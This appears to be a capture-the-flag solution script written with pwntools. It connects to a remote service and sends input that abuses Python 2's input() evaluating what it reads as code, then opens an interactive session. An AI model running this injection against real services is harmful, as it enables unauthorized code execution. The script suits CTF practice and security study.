from pwn import *

io = remote(args.HOST, args.PORT)

log.info("this exploits the fact that python2 input() is essentially eval()")

io.sendline(b"2018") # doesnt actually matter
io.sendline(b"city")

io.interactive()
